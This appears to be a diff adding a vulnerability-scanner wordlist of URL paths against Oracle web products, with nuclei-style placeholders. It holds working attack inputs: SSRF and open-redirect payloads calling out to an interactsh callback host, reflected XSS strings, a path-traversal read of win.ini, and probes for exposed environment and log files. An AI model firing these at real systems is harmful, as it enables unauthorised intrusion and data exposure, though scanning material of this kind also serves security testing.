@@ -1,0 +1,15 @@
+/reports/rwservlet/showenv
+/reports/rwservlet?report=test.rdf&desformat=html&destype=cache&JOBTYPE=rwurl&URLPARAMETER=file:///
+{{paths}}
+/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{interactsh-url}}
+/OA_HTML/cabo/jsps/a.jsp?_t=fredRC&configName=&redirect=%2f%5cinteract.sh
+/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow></TITLE></HEAD><body><script>alert(1337)</script><!--&>helpFile=concepts.html
+/OA_HTML/lcmServiceController.jsp
+/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
+/cgi-bin/printenv
+/OA_HTML/bin/sqlnet.log
+/html/bin/sqlnet.log
+
+/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert(
+/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert(
+/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(
